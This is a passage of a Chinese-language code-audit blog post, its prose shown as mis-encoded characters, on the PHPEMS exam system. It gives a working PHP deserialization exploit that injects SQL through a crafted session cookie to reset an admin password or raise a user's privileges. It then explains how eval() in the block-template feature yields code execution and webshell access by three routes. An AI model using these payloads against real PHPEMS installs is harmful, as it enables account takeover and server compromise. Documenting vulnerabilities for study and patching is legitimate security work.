<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022214617.png" alt="image-20240202221445574"></p>
<p>æ‰€ä»¥è®¾ç½®<code>$this-&gt;tablepre</code>çš„å€¼ä¸º</p>
<pre><code>x2_user SET userpassword = &#39;e10adc3949ba59abbe56e057f20f883e&#39; WHERE userid = 1  #
</code></pre>
<p>æœ€åå¾—åˆ°æ‹¼æ¥çš„sqlè¯­å¥ä¸º</p>
<pre><code class="sql">UPDATE x2_user SET userpassword = &#39;e10adc3949ba59abbe56e057f20f883e&#39; WHERE userid = 1  #session SET  WHERE 1 AND sessionid = :sessionid  LIMIT 512
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022216453.png" alt="image-20240202221639407"></p>
<p>è¿›å…¥åˆ°åé¢çš„<code>exec()</code>é‡Œï¼Œå› ä¸ºé¢„ç¼–è¯‘çš„å€¼éƒ½è¢«æ³¨é‡Šäº†ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“sqlè¯­å¥çš„æ‰§è¡Œ</p>
<p>æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218657.png" alt="image-20240202221816614"></p>
<p>çœ‹è¡¨é‡Œä¹Ÿè¢«ä¿®æ”¹äº†</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218439.png" alt="image-20240202221844373"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨æ„é€ åºåˆ—åŒ–çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„æ·»åŠ åˆ°ä¸€ä¸ªæ•°ç»„é‡Œï¼Œå¦åˆ™åœ¨æ‰§è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œä¼šæŠ¥é”™ï¼Œå¯¼è‡´æ— æ³•è¿›å…¥<code>__destruct()</code>æ–¹æ³•é‡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221783.png" alt="image-20240202222121705"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221035.png" alt="image-20240202222131934"></p>
<p>åŒæ—¶è¿˜è¦æ³¨æ„phpç‰ˆæœ¬ï¼Œphp5å’Œphp7ååºåˆ—åŒ–æ—¶å¯¹è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„æ•æ„Ÿæ€§ä¸ä¸€æ ·ï¼Œæ‰€ä»¥popé“¾æœ€å¥½åšæˆä»¥php5ç‰ˆæœ¬çš„ï¼Œè¿™æ ·php7æ‰é€šç”¨ï¼Œæˆ‘ä¹‹å‰å°±çŠ¯äº†è¿™ä¸ªé”™è¯¯ï¼Œå¯¼è‡´php5ç¯å¢ƒç”¨ä¸äº†ï¼Œå¯¼è‡´æŠ¥é”™</p>
<p>é€šè¿‡ä¿®æ”¹ç”¨æˆ·æƒé™çš„æ–¹å¼</p>
<pre><code class="php">&lt;?php
namespace PHPEMS&#123;

    class pdosql&#123;
        private $db;
        public $tablepre = &quot;x2_user SET usergroupid = 1 WHERE username = &#39;v2ish1yan&#39;  #&quot;;
        public function __construct()&#123;
            $this-&gt;db=new pepdo();
        &#125;
    &#125;

    class pepdo
    &#123;

    &#125;
    class session&#123;
        public function __construct()&#123;
            $this-&gt;pdosql=new \PHPEMS\pdosql();
            $this-&gt;db=new \PHPEMS\pepdo();
        &#125;
    &#125;

&#125;

namespace &#123;
    function encode($info)
    &#123;
        $info = serialize($info);
        $key = &quot;4b394f264dfcdc724a06b9b05c1e59ed&quot;;
        $kl = strlen($key);
        $il = strlen($info);
        for($i = 0; $i &lt; $il; $i++)
        &#123;
            $p = $i%$kl;
            $info[$i] = chr(ord($info[$i])+ord($key[$p]));
        &#125;
        return urlencode($info);
    &#125;
    $a=new \PHPEMS\session();
    $arr=array(&quot;sessionid&quot;=&gt;&quot;213&quot;,$a);
    echo urlencode(encode($arr));
&#125;
</code></pre>
<p>å°†å¾—åˆ°çš„å€¼è®¾ç½®ä¸º<code>exam_currentuser</code>ï¼Œå¸¦ç€è¿™ä¸ªcookieè®¿é—®ç½‘ç«™</p>
<p>æˆåŠŸä¿®æ”¹æƒé™ï¼Œç™»å½•åå°</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022232625.png" alt="image-20240202223224547"></p>
<h1 id="RCEï¼ˆä»£ç æ‰§è¡Œï¼‰"><a href="#RCEï¼ˆä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="RCEï¼ˆä»£ç æ‰§è¡Œï¼‰"></a>RCEï¼ˆä»£ç æ‰§è¡Œï¼‰</h1><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä»£ç æ‰§è¡Œé¦–å…ˆæ‰¾å…³é”®å‡½æ•°</p>
<p>åªæœ‰ä¸€ä¸ªæ–‡ä»¶é‡Œæœ‰æ‰§è¡Œ<code>eval()</code>å‡½æ•°</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031344783.png" alt="image-20240203134428647"></p>
<p>ä¸»è¦æ˜¯è¿™ä¸ªå‡½æ•°</p>
<pre><code class="php">public function parseBlock($blockid)
&#123;
    $block = $this-&gt;block-&gt;getBlockById($blockid);
    if($block[&#39;blocktype&#39;] == 1)
    &#123;
        echo html_entity_decode($block[&#39;blockcontent&#39;][&#39;content&#39;]);
    &#125;
    elseif($block[&#39;blocktype&#39;] == 2)
    &#123;
        if($block[&#39;blockcontent&#39;][&#39;app&#39;] == &#39;content&#39;)
        &#123;
            $args = array(&#39;catid&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;catid&#39;],&#39;number&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;number&#39;],&#39;query&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;query&#39;]);
            $blockdata = $this-&gt;_getBlockContentList($args);
            $tp = $this-&gt;tpl-&gt;fetchContent(html_entity_decode($this-&gt;ev-&gt;stripSlashes($block[&#39;blockcontent&#39;][&#39;template&#39;])));
            $blockcat = $this-&gt;category-&gt;getCategoryById($block[&#39;blockcontent&#39;][&#39;catid&#39;]);
            $blockcatchildren = $this-&gt;category-&gt;getCategoriesByArgs(array(array(&quot;AND&quot;,&quot;catparent = :catparent&quot;,&#39;catparent&#39;,$block[&#39;blockcontent&#39;][&#39;catid&#39;])));
            eval(&#39; ?&gt;&#39;.$tp.&#39;&lt;?php
 namespace PHPEMS; &#39;);
        &#125;
        else
        &#123;
            $args = array(&#39;catid&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;catid&#39;],&#39;number&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;number&#39;],&#39;query&#39;=&gt;$block[&#39;blockcontent&#39;][&#39;query&#39;]);
            $obj = \PHPEMS\ginkgo::make(&#39;api&#39;,$block[&#39;blockcontent&#39;][&#39;app&#39;]);
            if(method_exists($obj,&#39;parseBlock&#39;))
                $blockdata = $obj-&gt;parseBlock($args);
            else
                return false;
        &#125;
        return true;
    &#125;
    elseif($block[&#39;blocktype&#39;] == 3)
    &#123;
        if($block[&#39;blockcontent&#39;][&#39;sql&#39;])
        &#123;
            $sql = array(&#39;sql&#39; =&gt; str_replace(&#39;[TABLEPRE]&#39;,DTH,$block[&#39;blockcontent&#39;][&#39;sql&#39;]));
        &#125;
        else
        &#123;
            $tables = array_filter(explode(&#39;,&#39;,$block[&#39;blockcontent&#39;][&#39;dbtable&#39;]));
            $querys = array_filter(explode(&quot;\n&quot;,str_replace(&quot;\r&quot;,&quot;&quot;,html_entity_decode($this-&gt;ev-&gt;stripSlashes($block[&#39;blockcontent&#39;][&#39;query&#39;])))));
            $args = array();
            foreach($querys as $p)
            &#123;
                $a = explode(&#39;|&#39;,$p);
                if($a[3])
                &#123;
                    if($a[3][0] == &#39;$&#39;)
                    &#123;
                        $s = stripos($a[3],&#39;[&#39;);
                        $k = substr($a[3],1,$s-1);
                        $v = substr($a[3],$s,(strlen($a[3]) - $s));
                        $execode = &quot;\$a[3] = \&quot;&#123;\$this-&gt;tpl_var[&#39;$k&#39;]$v&#125;\&quot;;&quot;;
                    &#125;
                    else
                    &#123;
                        $k = substr($a[3],2,(strlen($a[3]) - 2));
                        $execode = &quot;\$a[3] = \&quot;&#123;\$$k&#125;\&quot;;&quot;;
                    &#125;
                    eval($execode);
                &#125;
                $args[] = $a;
            &#125;

            $data = array(false,$tables,$args,false,$block[&#39;blockcontent&#39;][&#39;order&#39;],$block[&#39;blockcontent&#39;][&#39;limit&#39;]);
            $sql = $this-&gt;pdosql-&gt;makeSelect($data);
        &#125;
        $blockdata = $this-&gt;db-&gt;fetchAll($sql,$block[&#39;blockcontent&#39;][&#39;index&#39;]?$block[&#39;blockcontent&#39;][&#39;index&#39;]:false,$block[&#39;blockcontent&#39;][&#39;serial&#39;]?$block[&#39;blockcontent&#39;][&#39;serial&#39;]:false);
        $tp = $this-&gt;tpl-&gt;fetchContent(html_entity_decode($this-&gt;ev-&gt;stripSlashes($block[&#39;blockcontent&#39;][&#39;template&#39;])));
        eval(&#39; ?&gt;&#39;.$tp.&#39;&lt;?php
 namespace PHPEMS; &#39;);
        return true;
    &#125;
    elseif($block[&#39;blocktype&#39;] == 4)
    &#123;
        $tp = $this-&gt;tpl-&gt;fetchContent(html_entity_decode($this-&gt;ev-&gt;stripSlashes($block[&#39;blockcontent&#39;][&#39;content&#39;])));
        eval(&#39; ?&gt;&#39;.$tp.&#39;&lt;?php
 namespace PHPEMS; &#39;);
    &#125;
    else
        return false;
&#125;
&#125;
</code></pre>
<p>ä»–çš„é€»è¾‘ï¼Œå°±æ˜¯ä»æ•°æ®åº“é‡Œå–å‡ºblockçš„å€¼ï¼Œç„¶åè¿›è¡Œç›¸å…³æ“ä½œ</p>
<p>åœ¨åå°çš„å†…å®¹-æ ‡ç­¾ç®¡ç†å¤„</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031352583.png" alt="image-20240203135237490"></p>
<p>å¯ä»¥è®¾ç½®4ç§ä¸åŒçš„ç±»å‹ï¼Œå¯¹åº”çš„å°±æ˜¯<code>blocktype</code>çš„å€¼</p>
<p>ç„¶åè¿™ä¸ªç³»ç»Ÿå®šä¹‰çš„æ ‡ç­¾ä¼šåœ¨æ³¨å†Œé¡µé¢è§¦å‘ï¼Œé€šè¿‡ä¿®æ”¹è¿™ä¸ªé‡Œé¢çš„å€¼å°±ä¼šé€ æˆä»£ç æ‰§è¡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031354798.png" alt="image-20240203135423716"></p>
<p>å¯¹äºè¿™ç§ä¼šå­˜å…¥æ•°æ®åº“å†å–å‡ºæ¥çš„æ“ä½œï¼Œè¿™ä¸­é—´çš„è¿‡ç¨‹å¯ä»¥ä¸ç”¨äº†è§£çš„å¤ªè¯¦ç»†ï¼Œå¯ä»¥ç›´æ¥çœ‹å–å‡ºçš„ç»“æœï¼Œå¦‚æœå–å‡ºçš„ç»“æœä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œå†å»çœ‹å¦‚ä½•å­˜å–å°±è¡Œäº†ã€‚</p>
<p>å¯ä»¥çŸ¥é“è¿™é‡Œä»£ç æ‰§è¡Œéƒ½æ˜¯ä½¿ç”¨</p>
<pre><code class="php">eval(&#39; ?&gt;&#39;.$tp.&#39;&lt;?php
 namespace PHPEMS; &#39;);
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031356636.png" alt="image-20240203135625492"></p>
<p>ä»£ç æ‰§è¡Œåˆ°è¿™æ—¶ï¼Œ<code>$tpl</code>çš„å€¼å°±æ˜¯æˆ‘ä»¬åŸå°ä¸åŠ¨å†™è¿›æ¨¡æ¿çš„å€¼ã€‚</p>
<p>åœ¨è¿™é‡Œè¦æ³¨æ„ï¼Œå¿…é¡»è¦å…ˆå£°æ˜ä¸€ä¸ªå¯¹è±¡ï¼Œå†æ‰§è¡Œæ¶æ„ä»£ç ã€‚è¿™æ˜¯phpçš„é¾Ÿè…šï¼š<code>Namespace declaration statement has to be the very first statement or after any declare call</code></p>
<h2 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¯ä»¥çœ‹åˆ°é™¤äº†ç¬¬ä¸€ç§ç±»å‹çš„blockï¼Œå…¶ä»–ä¸‰ç§éƒ½æœ‰<code>eval</code>å‡½æ•°</p>
<p>æ‰€ä»¥æœ‰ä¸‰ç§æ‰“æ³•</p>
<h3 id="æ ‡ç­¾ç±»å‹ä¸ºåˆ†ç±»åˆ—è¡¨"><a href="#æ ‡ç­¾ç±»å‹ä¸ºåˆ†ç±»åˆ—è¡¨" class="headerlink" title="æ ‡ç­¾ç±»å‹ä¸ºåˆ†ç±»åˆ—è¡¨"></a>æ ‡ç­¾ç±»å‹ä¸ºåˆ†ç±»åˆ—è¡¨</h3><p>åº”ç”¨è¦ä¸º<code>å†…å®¹</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031400434.png" alt="image-20240203140018343"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401226.png" alt="image-20240203140110906"></p>
<p>ç„¶åèšå‰‘è¿æ¥å³å¯</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401270.png" alt="image-20240203140158196"></p>
<h3 id="æ ‡ç­¾ç±»å‹ä¸ºSQLæ¨¡å¼"><a href="#æ ‡ç­¾ç±»å‹ä¸ºSQLæ¨¡å¼" class="headerlink" title="æ ‡ç­¾ç±»å‹ä¸ºSQLæ¨¡å¼"></a>æ ‡ç­¾ç±»å‹ä¸ºSQLæ¨¡å¼</h3><p>è¿™é‡Œæ‰‹å†™SQLçš„å€¼å¿…é¡»ä¸ºç©º</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031405707.png" alt="image-20240203140521613"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031404497.png" alt="image-20240203140441345"></p>
<p>èšå‰‘è¿æ¥å³å¯</p>
<h3 id="æ ‡ç­¾ç±»å‹ä¸ºæ¨¡æ¿æ¨¡å¼"><a href="#æ ‡ç­¾ç±»å‹ä¸ºæ¨¡æ¿æ¨¡å¼" class="headerlink" title="æ ‡ç­¾ç±»å‹ä¸ºæ¨¡æ¿æ¨¡å¼"></a>æ ‡ç­¾ç±»å‹ä¸ºæ¨¡æ¿æ¨¡å¼</h3><p>ç›´æ¥å†™å°±è¡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031406397.png" alt="image-20240203140645315"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031407650.png" alt="image-20240203140705496"></p>
<p>èšå‰‘è¿æ¥å³å¯</p>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2024-02-02</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
                            ä»£ç å®¡è®¡
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>